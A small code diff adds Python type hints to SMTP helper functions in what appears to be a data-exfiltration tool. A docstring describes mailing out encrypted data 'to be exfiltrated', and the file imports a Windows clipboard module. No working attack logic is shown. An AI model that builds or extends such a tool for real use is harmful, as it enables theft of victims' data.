@@ -37,7 +37,7 @@ if os.name == 'nt':
     import win32clipboard
 
 
-def smtp_handler(email_address: str, password: str, email):
+def smtp_handler(email_address: str, password: str, email: MIMEMultipart):
     """
     Facilitates sending the emails with the encrypted data to be exfiltrated.
 
@@ -63,7 +63,7 @@ def smtp_handler(email_address: str, password: str, email):
         logging.exception('Error occurred during email session: %s\n\n', mail_err)
 
 
-def email_attach(path: str, attach_file: str):
+def email_attach(path: str, attach_file: str) -> MIMEBase:
     """
     Creates email attach object and returns it.
 
@@ -85,7 +85,7 @@ def email_attach(path: str, attach_file: str):
     return attach
 
 
-def email_header(message, email_address: str):
+def email_header(message: MIMEMultipart, email_address: str) -> MIMEMultipart:
     """
     Format email header and add message in body.
 
